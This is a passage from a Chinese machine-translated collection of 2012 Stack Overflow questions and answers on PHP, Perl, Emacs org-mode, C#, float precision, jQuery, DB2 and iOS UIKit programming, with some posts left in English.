另一个重要因素是 SQL Server 度量标准是总经过时间，而不仅仅是查找该记录或从缓存中提取它所花费的时间。在 SQL Server 中，打开它`SET STATISTICS TIME ON`会将其分解得更多，但您仍然没有真正比较同类。

最后，我不确定这个基准测试的目标是什么，因为这是一个过于简单的查询。您是否在比较新项目的平台？你的选择标准是什么？

# php - 从 iOS 调用 php 函数

> ID：10991696
> 
> 赞同：0
> 
> 时间：2012-06-12T06:47:01.477
> 
> 标签：php, ios, asihttprequest

我正在使用 ASIHTTPREQUEST 库并成功地将数据发布到 php 脚本。

但是，我确实有一个包含相关函数的脚本，我想从 iOS 调用这些函数。

这可能吗？如果是这样，这是一种很好的方法，还是应该使用 isset($_POST['blah']) 作为参数和另一个 isset 并传入函数名？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-12T07:11:49.807

是的，如果此脚本在不同的服务器上运行，您可以在调用脚本时简单地使用 POST 或 GET。您可以尝试使用本页订阅的方式：

[ASIHTTPRequest 将 json 发送到 php 服务器](https://stackoverflow.com/questions/5338001/asihttprequest-post-json-to-php-server)

您可以发布一个索引为“action”的数组，您可以在其中包装一个 Switch-case。

```
$action = isset( $_POST['action'] )? $_POST['action']: false;

switch( $action ) {
    case 'function':
        // Do your thing
      break;
    default:
        // Unknow call
      break;
} 
```

# perl - Perl 中的静态代码分析模块

> ID：10991702
> 
> 赞同：2
> 
> 时间：2012-06-12T06:47:34.007
> 
> 标签：perl, static-code-analysis, perl-critic

除了 B::Lint 和 Perl::Critic 之外，Perl 中是否有任何静态代码分析模块？Module::Checkstyle 的效果如何？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-29T12:52:57.980

perlmonks.org 上有一篇[帖子](http://www.perlmonks.org/?node_id=943316)询问 PPI 是否可用于静态分析。根据对该模块的[评论](http://cpanratings.perl.org/dist/PPI)， PPI 是 Perl::Critic 背后的力量。（我还没有使用它）。

然后是[perltidy](http://en.wikipedia.org/wiki/PerlTidy)。

# c++ - org-mode 导出 html 时无法高亮 C++ 源代码

> ID：10991704
> 
> 赞同：13
> 
> 时间：2012-06-12T06:47:39.850
> 
> 标签：c++, emacs, org-mode

我正在使用组织模式 V7.8.09。当我试图将以下 c++ 代码块导出到 html 时，

```
#+begin_src c++
  int a=1;
  int b=1;
  printf("%d\n", a+b);
#+end_src 
```

消息失败

```
org-babel-exp processing...
font-lock-fontify-keywords-region: Symbol's value as variable is void: font-lock-end-statement-face` 
```

有趣的是，如果我声称它是 python 代码，它会成功导出......

```
#+begin_src python
  int a=1;
  int b=1;
  printf("%d\n", a+b);
#+end_src 
```

`(org-babel-do-load-languages 'org-babel-load-languages '((C . t)))`在我添加后`init.el`，错误消息消失了，c++ 代码可以成功导出为 html。但是 c++ 代码没有突出显示，而 python 代码突出显示很好。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-29T04:54:40.047

您需要加载的包是 emacs/lisp/org/ob-C.el

[https://bitbucket.org/nobeira/dot.emacs.d/src/c6af5b1535b1/elisp/org-7.4/lisp/ob-C.el](https://bitbucket.org/nobeira/dot.emacs.d/src/c6af5b1535b1/elisp/org-7.4/lisp/ob-C.el)。

没有 C++ 包

.emacs.el 配置文件：

```
(org-babel-load-languages (C . t)))
(setq org-src-fontify-natively t) 
```

组织文件：

```
#+BEGIN_SRC cpp   :includes <stdio.h> :exports both
 int a=1;
 int b=1;
 printf("%d\n", a+b);
#+END_SRC 
```

对我来说，仅使用 cpp source_name 工作（字体化和运行）

坎迪多

# c# - 评估规则

> ID：10991705
> 
> 赞同：1
> 
> 时间：2012-06-12T06:47:43.937
> 
> 标签：c#, c#-4.0

我有一个如下表：

**规则步骤**

```
StepID | Step Property | Step Condition Id | Step Value | Logical Operator | Next Step Id 
```

其中一行可能如下：100、Name、200（表示等于）、AnyName、210（表示 And）、300（指向下一步 id）。

上面的意思是我应该评估一个规则，它有一个步骤说 Name 应该等于 AnyName 并且下一步由运算符 AND 链接。下一步可以说 - 年龄应该等于 10。

这些规则应针对具有 2 个属性 Age 和 Name 的对象 Person 进行评估。我必须验证人名是否为 AnyName 且 Age 是否为 10。

你能告诉我我该怎么做吗？有没有可以支持这个的库？C# 中是否有任何特定功能可以帮助我？

谢谢， - 迈克

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T06:52:36.897

> C# 中是否有任何特定功能可以帮助我？

就在这里。您可以从表中的数据构建[LINQ 表达式树，将](http://msdn.microsoft.com/en-us/library/bb397951.aspx)[其动态编译](http://msdn.microsoft.com/en-us/library/bb356928.aspx)为函数对象，然后针对目标对象执行生成的[lambda 。](http://msdn.microsoft.com/en-us/library/system.linq.expressions.lambdaexpression.aspx)图书馆需要一点时间来适应，但是你得到的结构非常强大而且速度非常快，所以花时间学习它的回报确实是巨大的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T06:53:17.507

您可以尝试通过 NuGet获得的[LinqKit](http://www.albahari.com/nutshell/linqkit.aspx)包中的[PredicateBuilder 。](http://www.albahari.com/nutshell/predicatebuilder.aspx)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-12T06:54:56.923

使用反射的快速而肮脏的例子：

```
bool CheckEqualityRule (object target, string propertyName, string testValue)
{
    var property = target.GetType().GetProperty(propertyName);
    var value = (string)property.GetValue(target, null);
    return value == testValue;
} 
```

# c# - 使用 FLEE 和自定义表达式上下文的表达式解析

> ID：10991712
> 
> 赞同：0
> 
> 时间：2012-06-12T06:48:38.010
> 
> 标签：c#, vb.net, parsing, generics, .net-2.0

我正在使用[Flee](http://flee.codeplex.com/)构建公式生成器。它工作得很好，但我面临的唯一问题是 Flee 不理解我猜的[通用方法。](http://msdn.microsoft.com/en-us/library/twcad0zb%28v=vs.80%29.aspx)

我在我正在使用的表达式上下文中声明了一个名为 IIf 的函数。

```
Public Function IIf(Of T)(ByVal cond As Boolean, ByVal left As T, ByVal right As T) As T
    Return If(cond, left, right)
End Function 
```

现在我可以说我正在评估

```
IIF(A==B,1,5) 
```

当我试图编译表达式时，Flee 抛出一个 ExpressionException 说明 -

```
The function IIf(boolean, Int32, Int32) is not declared. 
```

我该如何解决这个问题。从某种意义上说，我的意思是不能编写所有 .net 原始类型的函数的所有可能重载。我应该采取什么方法。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-16T09:57:46.707

在关于 FLEE 的讨论中，一位发帖人设法让 Generics 工作。查看[http://flee.codeplex.com/discussions/14611](http://flee.codeplex.com/discussions/14611#PostContent_49159)。实际上，发布者将包含类声明为 Generic。

或者，根据此讨论，可能没有办法取决于您的类的结构：http: [//flee.codeplex.com/discussions/355342](http://flee.codeplex.com/discussions/355342#PostContent_836666)，其中指出发布者必须为原始数据类型声明公共重载。

您也可以避免使用对象声明一个泛型方法并关闭`Option Strict`以允许隐式转换，如下所示：

```
Public Function IIf(ByVal cond As Boolean, ByVal left As Object, ByVal right As Object) As Object
    Return If(cond, left, right)
End Function 
```

# php - 了解php中的浮点数

> ID：10991713
> 
> 赞同：4
> 
> 时间：2012-06-12T06:48:41.347
> 
> 标签：php, floating-point, floating-accuracy

我知道这些问题可能会被问到很多，但是从我的阅读和测试来看，这让我有点困惑，而且我所做的很多阅读让我更加困惑，因为它非常复杂。

有些人似乎对简单的比较有问题，但我自己没有问题。

例如...

```
$num1 = 27.64;
$num2 = 27.64;

if ($num1 == $num2) {
    echo 'Good!';
} else {
    echo 'Bad!';
}

// Echo's "Good!" 
```

...和

```
$num1 = 27.60;
$num2 = 27.6;

if ($num1 == $num2) {
    echo 'Good!';
} else {
    echo 'Bad!';
}

// Echo's Good 
```

...和

```
$num1 = 27.60;
$num2 = 57.60;

if ($num1 <= $num2) {
    echo 'Good!';
} else {
    echo 'Bad!';
}

// Echo's Good 
```

...和

```
$num1 = 25.00;
$num2 = 12.50 + 12.5;

if ($num1 == $num2) {
    echo 'Good!';
} else {
    echo 'Bad!';
}

// Echo's Good 
```

然后我看到像[http://patchlog.com/php/comparing-float-values-in-php/](http://patchlog.com/php/comparing-float-values-in-php/)这样的页面似乎有简单的问题，我不明白。

我只是想了解他的简单代码是如何遇到问题的，但我不同意我的。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-12T12:53:39.557

## 示例 1

这些值将是相同的——您为每个变量分配相同的十进制文字。将其与此代码进行比较：

```
$num1 = 27.64;
$num2 = 10.0 + 2.88 + 2.88 + 2.88 + 9.0; //In decimal arithmetic adds to 27.64

if ($num1 == $num2) {
    echo 'Good!';
} else {
    echo 'Bad!';
}

// Echo's "Bad!" 
```

$num2 看起来应该是 27.64，但它确实增加了 27.639999999999997015720509807579219341278076171875 （这就是我在我的机器上用 Visual C++ 进行计算时得到的结果）。$num1 = 27.6400000000000005684341886080801486968994140625（在我的机器上），所以它们不同。

## 示例 2

尾随的 0 没有区别。

## 示例 3

这些数字不在浮点“公差”范围内，因此当然会有所不同。

## 示例 4

12.5 完全可以用浮点表示，所以 12.5 + 12.5 也是（0.5 是 2^-1）。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-12T06:53:50.660

这是一个明显的例子：

```
$a = 0;
for ($i = 0; $i < 100000; $i++) {
    $a += 0.00001;
}
print("$a\n"); 
```

你会期望你会被`1`打印出来，但实际上输出是`0.99999999999808`.

（结果是在 x86_64 架构上）

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-12T06:51:28.320

浮点数越大（或越小），精度就越低。确切的精确度会因处理器架构而异。

尝试在 1E30 或 1E-30 进行所有测试...

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-06-12T06:52:54.843

前两个具有编译器提供的值，它将两个数字解析为相同的位模式。

我不会触及第三个，因为它的工作原理应该很明显。

对于第四个，使用的值具有定义明确、完全准确的位模式。尝试在人迹罕至的地方使用更多的数字。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-06-12T07:30:40.440

你可以试试

```
 $a = '12.30'; 
```

作为字符串以获得完全匹配，否则默认情况下浮动框删除结尾“0”。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-06-12T15:00:59.727

浮点错误仅在存在数学结果不能以浮点精确表示的运算时发生。错误被精确定义；它们不是随机的或任意的，因此当执行相同的操作时会产生相同的结果。

在您的第一个示例中，您将“27.64”分配给 $num1 和 $num2。这里有一个操作：解析器必须解释字符串“27.64”并产生一个浮点结果。解析器很可能会生成最接近 27.64 的浮点数。（作为十六进制浮点数，该数字为 0x1.ba3d70a3d70a4p+4。“p”之前的部分是十六进制数字，带有小数部分。“p4”表示乘以 2 ⁴。作为十进制数字，它是 27.64000000000000005684341886080801486968994140625。）它在两种情况下都产生相同的数字，因此 $num1 与 $num2 的比较表明它们彼此相等，尽管两者都不等于 27.64（因为 27.64 不能用浮点数精确表示）。

在您的第二个示例中，最接近数字“27.60”的值的浮点数与最接近数字“27.6”的值的浮点数相同，因为这两个数字代表相同的值。所以，再次，你会得到相同的结果。

在您的第三个示例中，两个数字的值相距甚远，因此您得到不同的浮点数，并且比较表明它们不相等。

在您的第四个示例中，所有值都可以用浮点数精确表示，因此没有错误。25、12.50 和 12.5 都是 2 的幂的小倍数（包括负指数的幂，例如 .5 = 2 ^(-1)，在浮点类型的范围内，因此它们是可表示的。此外， 12.50和12.5的和是完全可表示的，所以相加没有舍入误差，所以所有的结果都是准确的，比较是和等于25。

当人们期望从两个具有相同数学结果的不同计算中得到相同的结果时，就会出现问题。一个经典的例子是将“.3”与“.1+.2”进行比较。将数字“.3”转换为浮点会产生最接近的可表示值，即 0x1.3333333333333p-2 (0.299999999999999988897769753748434595763683319091796875)，略低于 0.3。将“.1”转换为浮点会产生最接近的可表示值，即 0x1.999999999999ap-4 (0.1000000000000000055511151231257827021181583404541015625)，略高于 0.1。将“.2”转换为浮点会产生最接近的可表示值，即 0x1.999999999999ap-3 (0.200000000000000011102230246251565404236316680908203125)，略高于 0.2。将后两个值相加得到最接近它们总和的可表示值，即 0x1.3333333333334p-2 (0\. 3000000000000000444089209850062616169452667236328125）。如您所见，该总和与将“.3”转换为浮点获得的值不同，因此比较它们表明它们不相等。

# layout - Blackberry WebWorks：方向更改后高度错误

> ID：10991719
> 
> 赞同：0
> 
> 时间：2012-06-12T06:49:04.233
> 
> 标签：layout, blackberry, orientation, blackberry-webworks

将我的黑莓设备（Torch 9860）从横向旋转到纵向后，高度没有更新。打印的值`window.innerHeight`表明该值没有改变。有时当我以纵向模式重新加载应用程序时，它具有正确的高度，旋转到横向工作正常。

在头部我定义了这样的视口：

```
<meta name="viewport" content="width=device-width,height=device-height,user-scalable=no,initial-scale=1.0"> 
```

在 CSS 我定义：

```
body {
    margin: 0;
    padding: 0;
    width: 100%;
    height: 100%;
} 
```

我也尝试自己在`window.onorientationchange`监听器中将高度（和宽度）设置为screen.height，但是这个值比视口大（大约1.5倍）。

我究竟做错了什么？我该怎么做才能使身体始终具有屏幕尺寸？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T14:06:48.133

我实际上正在寻找类似问题的解决方案：我正在尝试显示 100% 的视觉视口高度的元素。我的问题是我的视口高度考虑了地址栏（所以 100% 是 100% 但减去滚动条高度），这是我不想要的（因为如果用户滚动，地址栏将不可见，因此我的元素太小了）。

对于您的问题，我认为您只需要像我一样`"height=device-height"`从视口中删除`meta tag`，因为 BB 设备似乎不会在方向更改时再次计算此值（这对我来说似乎是一个错误）。

对不起我的英语不好！

# jquery - 使用 jquery 清除多个 div

> ID：10991723
> 
> 赞同：4
> 
> 时间：2012-06-12T06:49:31.330
> 
> 标签：jquery

快速提问。如果我试图一次清除具有相同类的多个 div，是否有 jQuery 捷径来执行此操作？我试过`$('.clearit').empty();`了，但这似乎根本不起作用（该类的 div 上没有一个被清除）。我可能做错了还是这不起作用？告诉我，我试过了`$('.clearit').html('');`。此外，我还拥有它以及在 jquery 中运行的其他代码，其他所有代码都按应有的方式运行。我调试了代码，它似乎运行了函数并继续前进，没有错误，但 div 内容没有被清除。以下是 div 的示例：

```
<center><div class="clearit" id="container2">Loading the player ...</div></center>
</li>
<li>
<center><div class="clearit" id="container3">Loading the player ...</div></center>
</li>
<li>  
<center><div class="clearit" id="container4">Loading the player ...</div></center> 
```

这是其中一个处理程序的代码。请注意，除了`$('.clearit').html('');`.

```
$('.thumbNav li a').click(function(){
    $('.clearit').html('');

var str = $(this).html();
var pattern = /[0-9]+/g;
var matches = str.match(pattern);
var myInteger = parseInt(matches);
//variable for player
var container = "container"+myInteger;
var what = 'skill'+myInteger;
var location = "https://aliahealthcare.com/videofetcher.php?id=skill"+myInteger;
player(container,what,location);  

$('#'+what).attr('selected', 'selected');   

    }); 
```

对于仍在帮助我的任何人，非常感谢！我还修改了该站点，因此您不再需要登录即可进入，因此您可以自己查看它的运行情况。请使用上面的代码作为查找 javascript 的参考。（都位于 vid.php 中）谢谢

[https://aliahealthcare.com/vid.php](https://aliahealthcare.com/vid.php)

我也刚刚发现了一些有趣的东西。上面的 li 是具有滑块 id 的 ul 的一部分。当我这样做`$('#slider').html('');`或`$('#slider').empty();`它工作时，它会清除所有 div，因此在这些 div 中加载的播放器不会加载。我需要做的就是清除玩家，这样你就不能同时运行多个玩家。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-12T06:51:30.667

请在此处查看工作**演示**：http : [//jsfiddle.net/TxR8K/](http://jsfiddle.net/TxR8K/)

**从您给定的代码**更新：http:** [//jsfiddle.net/TxR8K/1/](http://jsfiddle.net/TxR8K/1/)**

 **顺便说一下，您的无序列表标记即`ul`示例中缺少:)

**在与 OP 讨论后进一步更新**- 我们还发现 - 玩家实际上不是 div 中 html 的一部分，因此他/她知道需要做什么并为进一步修复扫清了道路:)

这应该可以解决问题

```
 $('.clearit').html(''); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-12T06:52:55.383

您的问题很可能是您在 DOM 加载之前运行该命令。在 StackOverflow 中打开一个控制台窗口并运行`$("div").empty();`. 一切都消失了！

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-06-12T06:56:03.953

您的代码应该可以正常工作。

请检查

*   `$(document).ready(function() {...})`简而言之，您将代码放入其中`$(function() {..})`

*   您正在正确加载**jQuery 库**

*   没有任何拼写错误

如果一切正常，那么您的代码应该可以工作。

如果没有，请尝试使用**@Tats_innit**答案。

### 根据你编辑

## 我仍然认为您的代码应该可以工作。

但如果没有，那么你可以试试这个：

```
$('div[id^=container].clearit').empty(); 
```

**[演示](http://jsfiddle.net/U29nv/)****

# powerbuilder - 如何在 Powerbuilder 应用程序中使用 TWAIN

> ID：10991725
> 
> 赞同：0
> 
> 时间：2012-06-12T06:50:11.817
> 
> 标签：powerbuilder, scanning, twain

我们有一个 powerbuilder 应用程序，我们希望通过该应用程序使用 TWAIN 驱动程序来使用扫描仪。有没有人有关于如何开发它的经验或代码示例？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-29T23:59:32.303

**使用普通**的 PowerScript（不考虑可能的 ActiveX 控件）将 TWAIN 集成到 PowerBuilder 中是困难的（并且可能是不可能的）。

工作解决方案（对我而言）是基于[TWAIN 示例代码](http://sourceforge.net/projects/twain-samples/files/TWAIN%202%20Sample%20Application/)创建 Dll (C++) 。简单来说

*   PowerBuilder 应用程序创建响应窗口（模式对话框）
*   调用 Dll 函数来覆盖窗口过程：SetWindowLong(handle(..), GWL_WNDPROC, MyFunction)
*   并启动 TWAIN 传输。

C++ 中的示例应用程序正在运行。但是，当然，为 PowerBuilder 采用它需要进行一些更改。

# c# - 输入字符串的格式不正确。在 System.Number.ParseDecimal DB2。执行数据集

> ID：10991729
> 
> 赞同：0
> 
> 时间：2012-06-12T06:50:39.227
> 
> 标签：c#, ado.net, odbc, db2

当我尝试在 db2 服务器中执行数据集时出现此异常。最奇怪的是单元测试代码不会抛出异常，但是当我尝试从网页中使用相同的参数调用它时，它会抛出异常。

这是我的单元测试代码：

```
[Test]
        public void Get_the_car_details_via_the_chassisnumber_WVWZZZ1KZCW240208()
        {
            //Arrange
            string chassisNumber = "WVWZZZ1KZCW240208";

            string brand = "skoda";

            //Act
            Vehicle car = VehicleDA.GetVehicle(chassisNumber, "", brand).GetResult();

            //Assert
            Assert.IsNotNull(car);
            car.Type.ShouldBe("VOLKSWAGEN GOLF");

        } 
```

这是我从页面中调用它的方式，如您所见，我对相同的参数进行了硬编码，但它仍然不起作用

```
public Vehicle GetVehicleInformation(string chassis, string commissionnumber, string brand)
        {
            Vehicle car = VehicleDA.GetVehicle("WVWZZZ1KZCW240208", commissionnumber, "skoda").GetResult(); 
```

这是dal中的DB代码

```
public class VehicleDA
    {
        public static ResultForType<Vehicle> GetVehicle(string chassisNumber, string commissionNumber, string brand)
        {

            if (chassisNumber.Length != 17 && chassisNumber.Length > 0)
            {
                chassisNumber = new ChassisNumberSearch().GetCompleteChassisNumber(chassisNumber);
                if (chassisNumber == string.Empty)
                {
                    return CreateReturnWithError("Unknown chassis number");
                }
            }

            if (chassisNumber == string.Empty)
            {
                chassisNumber = GetTheLatestChassisNumberInCaseOfMultipleChassisNumbers(new ChassisNumberSearch().GetChassisNumber(commissionNumber));
                if (chassisNumber == string.Empty)
                {
                    return CreateReturnWithError("Unknown commision number");
                }
            }

            var vehicleXMLString = new VehicleSearch().GetVehicle(chassisNumber);

            if (GetDateTimeDataFor("DFACUSI", vehicleXMLString) < DateTime.Now.AddYears(-2))
            {
                return CreateReturnWithError("Vehicle is older then 2 years");
            }

            if ( GetDateTimeDataFor("DFACTUR", vehicleXMLString) == DateTime.MinValue)
            {
                return CreateReturnWithError("Invoice date is not filled in");
            }

            var vehicle = new Vehicle
                                  {
                                      Chassis = chassisNumber,
                                      ComissionNumber = GetDataFor("NCOMMIS", vehicleXMLString),
                                      Type = GetDataFor("LMAKTYP", vehicleXMLString),
                                      Year = GetIntDataFor("CANNMOD", vehicleXMLString),
                                      OrderDate = GetDateTimeDataFor("D705DAT", vehicleXMLString),
                                      InvoiceDate = GetDateTimeDataFor("DFACTUR", vehicleXMLString),
                                      InvoiceNumber = GetDataFor("NFACTUR", vehicleXMLString),
                                      DeliveryDate = GetDateTimeDataFor("DLIVRAI", vehicleXMLString),
                                      RegistrationDate = GetDateTimeDataFor("DIMMFIR", vehicleXMLString),
                                      CataloguePrice = GetDecimalDataFor("VPRICAT", vehicleXMLString),
                                      InvoicePrice = GetDecimalDataFor("VPRIFAC", vehicleXMLString),
                                      Code = GetDataFor("CINTERM", vehicleXMLString)

                                  };

            var result = new ResultForType<Vehicle>(vehicle);
            if (!vehicle.Type.ToLower().StartsWith(brand.ToLower()))
            {
                result.AddWarning("Brand of the dealer is different from the brand of the vehicle");
            } 

            if (vehicle.RegistrationDate < DateTime.Now.AddMonths(-3))
            {
                result.AddWarning("Registration date is older then 3 months");
            }

            //"Registration date is older then 3 months"

            return result;
        }

 public class VehicleSearch : DB2Base
    {
        public string GetVehicle(string chassisNumber)
        {
            const string procName = "CALL DBSP.xxx(?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)";

            var cmd = DB2Database.GetStoredProcCommand(procName);
            cmd.CommandType = CommandType.Text;

            if (chassisNumber.Length > 17)
            {
                chassisNumber = chassisNumber.Substring(0, 17);
            }

            CreateInputParameter("CFONCTI", cmd, "RB");
            CreateInputParameter("CFORMAT", cmd, "X");
            CreateInputParameter("CLANGUE", cmd, "E");
            CreateInputParameter("FEXTEND", cmd, "Y");
            CreateInputParameter("NCHASSI", cmd, chassisNumber);
            CreateStringParameter("LLIGXML", cmd, 250);
            CreateStringParameter("CIDFVAR", cmd, 10);
            CreateStringParameter("LVALVAR", cmd, 250);
            CreateStringParameter("CEQUIPE", cmd, 4);
            CreateStringParameter("CEQUPAC", cmd, 4);
            CreateStringParameter("LEQUCOUF", cmd, 30);
            CreateStringParameter("LEQUCOUN", cmd, 30);
            CreateStringParameter("LEQUCOUD", cmd, 30);
            CreateStringParameter("LEQUCOUE", cmd, 30);
            CreateStringParameter("LEQULONF", cmd, 120);
            CreateStringParameter("LEQULONN", cmd, 120);
            CreateStringParameter("LEQULOND", cmd, 120);
            CreateStringParameter("LEQULONE", cmd, 120);
            CreateStringParameter("CTYPOPT", cmd, 1);
            CreateStringParameter("CCATOPT", cmd, 1);
            CreateStringParameter("CEQUGEN", cmd, 4);
            CreateDecimalParameter("VHTVAXX", cmd, 10);
            CreateStringParameter("CRETOUR", cmd, 2);
            CreateStringParameter("LMSGERR", cmd, 70);
            CreateStringParameter("LSPPROG", cmd, 8);
            CreateStringParameter("LSPPARG", cmd, 30);
            CreateSmallIntParameter("CSPRETC", cmd, 2);
            CreateIntParameter("CSQLAST", cmd, 4);
            CreateStringParameter("LSQLMSG", cmd, 70);

            var dataset = DB2Database.ExecuteDataSet(cmd);
            var result = new StringBuilder();

            if (dataset.HasRowsInTheFirstTable())
            {
                foreach (DataRow row in dataset.Tables[0].Rows)
                {
                    result.Append(row[0]);
                }
            }

            return result.ToString();
        } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T08:13:45.940

我不知道问题出在哪里，但是用 ExecuteDatareader 更改 ExecuteDataSet 效果很好。

# nested-lists - 添加/删除无序列表/子列表（两级）Jquery

> ID：10991731
> 
> 赞同：0
> 
> 时间：2012-06-12T06:50:46.010
> 
> 标签：nested-lists

我想使用无序列表创建一个表单，`ul`必须只有两个级别，我在这个演示中没有得到：

[http://jsfiddle.net/rathoreahsan/9SCCn/](http://jsfiddle.net/rathoreahsan/9SCCn/)

当我添加一个子列表时，它会添加一个父列表的子列表（很好），但是当我添加另一个子列表时，它会为新添加的子列表添加一个子列表（我不想要）。我希望当我添加子列表时，它只添加父列表的 1 个子列表，而不是添加新添加的子列表的子列表。

当前结构：

```
<ul>
    <li><input type="text" />
        <ul>
            <li><input type="text" /></li> // New added sub list
                <ul> //It should'nt be like this when added more 
                    <li><input type="text" /></li>
                </ul>
            </li>
        </ul>
    </li>
</ul> 
```

结构应该是这样的：

```
<ul>
    <li><input type="text" />
        <ul>
            <li><input type="text" /></li> // New added sub list
            <li><input type="text" /></li> //It should be like this when added more
        </ul>
    </li>
</ul> 
```

**编辑** 终于得到了解决方案参见Workin Demo：http: [//jsfiddle.net/rathoreahsan/2hwLp/](http://jsfiddle.net/rathoreahsan/2hwLp/)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-28T10:00:29.737

**查询**

```
$.fn.exists = function(){ return this.length>0; }    
function dBtnClick(val){
    if( $('#duties li#' + val + ' ul.sublists').exists() ) 
    {
       $('#duties li#' + val + ' ul.sublists').append('<li><input type="text" /></li>')
    } 

   else if( !$('#duties li#' + val + ' ul.sublists').exists() ) 
   {
     $("#duties li#" + val).append('<ul class="sublists"><li><input type="text" /></li></ul>')
   }
}

var dutiesListID = $('#duties li#0').attr('id');
var d_cur_no = parseInt(dutiesListID);

$('#dr').click(function(){
    d_cur_no++;
    $('#duties').append('<li id="' + d_cur_no + '"><input type="text" />&nbsp;&nbsp;<a href="javascript:void(0)" onclick="dBtnClick(' + d_cur_no + ');">Add Sub List Item</a></li>');
}); 
```

**HTML：**

```
<h3>Duties and Responsibilities:</h3>
<ul id="duties">
    <li id="0"><input type="text" />&nbsp;&nbsp;<a href="javascript:void(0)" class="dbtn" onclick="dBtnClick(0)">Add Sub List Item</a></li>
</ul>
<span class="controls">
    <a href="javascript:void(0)" id="dr">Add List Item</a>
</span> 
```

**演示：http:** [//jsfiddle.net/rathoreahsan/2hwLp/](http://jsfiddle.net/rathoreahsan/2hwLp/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T07:04:16.563

这可能有效：

在此处更改 html 部分：

```
<ul id="duties">
    <li class="top-level"><input type="text" /></li>
</ul> 
```

和 js 部分在这里：

```
$('#dr-sub').click(function(){
$('.top-level').last().append('<ul><li><input type="text" /></li></ul>'); 
```

});

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-12T07:08:05.027

尝试像这样更改它：

> `$('#duties li').last().append('<li><input type="text" /></li>');`

# objective-c - 在 UIImageView 上绘制 UIBezierPath

> ID：10991734
> 
> 赞同：1
> 
> 时间：2012-06-12T06:51:05.330
> 
> 标签：objective-c, ios, cocoa-touch, uiimageview, uibezierpath

我怎么`UIBezierPath`画`UIImageView`？我试过以下代码，但是当`UIImageView's`图像是`nil`我只能看到路径，当我添加图像时，这个路径与`UIImageView's`图像重叠。我想在`UIImageVIew's`图像上方绘制路径。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-01T11:02:25.240

是的，您可以通过在 uiview 中使用 DrawRect 之类的绘制方法在 uiimageview 中绘制贝塞尔路径。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-01-16T06:32:48.177

尝试`UIView`在`UIImageView`. 为这个透明视图创建一个 UIView 子类。覆盖`drawRect`此子类中的方法。 `stroke`您要绘制的所有路径。

如果您需要此示例代码，请回复我。

# iphone - Assign UIButton event dynamically in UITableViewCell

> ID：10991739
> 
> 赞同：2
> 
> 时间：2012-06-12T06:51:27.907
> 
> 标签：iphone, objective-c, ios, uitableview, ios5

I created a custom UITableViewCell subclass which contains a button named `testbtn`. I then tried to assign an event of that button to another class, but that isn't working for me. Please can you tell me where I am going wrong?

Here is my code:

```
 - (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath{
    static NSString *CellIdentifier = @"PatientCell";
    PatientCell *cell = (PatientCell *)[tableView dequeueReusableCellWithIdentifier:CellIdentifier];
    if (cell == nil)
    {
        if ([[UIDevice currentDevice] userInterfaceIdiom] == UIUserInterfaceIdiomPhone) {
            NSArray *TopLevelOb = [[NSBundle mainBundle] loadNibNamed:@"PatientCell" owner:self options:nil];
            for (id currentlevelob in TopLevelOb) {
                if([currentlevelob isKindOfClass:[PatientCell class]]){
                    cell = (PatientCell *) currentlevelob;
                    cell.test.text = @"some text";
                    cell.HR.text =@"80";
                    cell.ABP.text =@"120/20";
                    cell.SOP2.text =@"95";
                    cell.RR.text=@"98";
                    [cell.testbtn addTarget:self action:@selector(openLiveData:)   
                       forControlEvents:UIControlEventTouchUpInside];// **this event is not fire to openLiveData method**
                    break;
                }
            }
        } else {
            NSArray *TopLevelOb = [[NSBundle mainBundle] loadNibNamed:@"PatientCell_iPad" owner:self options:nil];
            for (id currentlevelob in TopLevelOb) {
                if([currentlevelob isKindOfClass:[PatientCell class]]){
                    cell = (PatientCell *) currentlevelob;
                    cell.test.text = [nameArry objectAtIndex:indexPath.row];
                    cell.HR.text =@"80";
                    cell.ABP.text =@"120/20";
                    cell.SOP2.text =@"95";
                    cell.RR.text=@"98";
                    [cell.testbtn addTarget:self action:@selector(openLiveData:) forControlEvents:UIControlEventTouchUpInside]; 
                    break;
                }
            }     
        }
    }
    return cell;
}

-(IBAction)openLiveData:(id)sender{
     NSLog(@"hello ");
 } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T15:51:56.380

Check to see if your button is wired up to the testBtn instance variable in your NIB.

Good Luck

T

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T06:56:26.683

Do this as forgot to specify Control Event:

```
 [cell.testbtn addTarget:self action:@selector(openLiveData:) forControlEvents:UIControlEventTouchUpInside]; 
```

Hope helpful

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-12T07:00:33.300

It should be working fine in the iPhone version but should be a problem in the iPad version as you mentioned `forControlEvents:UIControlStateNormal` in the place of `forControlEvents:UIControlEventTouchUpInside`.

# objective-c - 在两个视图控制器之间传递字典？

> ID：10991743
> 
> 赞同：0
> 
> 时间：2012-06-12T06:51:42.923
> 
> 标签：objective-c, ios, cocoa-touch

